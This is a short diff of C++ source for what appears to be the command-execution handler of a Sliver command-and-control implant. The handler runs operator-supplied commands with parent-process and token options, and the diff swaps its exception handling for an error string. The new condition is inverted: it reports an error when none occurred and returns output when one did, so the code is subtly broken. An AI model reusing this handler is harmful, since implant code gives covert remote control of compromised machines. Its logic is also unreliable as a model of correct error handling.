@@ -76,14 +76,15 @@ namespace handlers {
 		cmd.append(" ");
 		for (auto it = req.args().begin();it != req.args().end();++it)
 			cmd.append(it->c_str());
-		try {
-			auto output = taskrunner::execute(cmd, req.output(),req.ppid(),req.usetoken());
-			resp.set_stdout_pb(output);
-		}
-		catch (exception& e) {
+		string error = "";
+		auto output = taskrunner::execute(error,cmd, req.output(),req.ppid(),req.usetoken());
+		if (error == "") {
 			auto common_resp = new sliverpb::Response();
-			common_resp->set_err(std::format("execute triggered exception: {}",e.what()));
+			common_resp->set_err(error);
 			resp.set_allocated_response(common_resp);
+		}
+		else {
+			resp.set_stdout_pb(output);
 		}
 		return wrapResponse(taskID, resp);
 	}
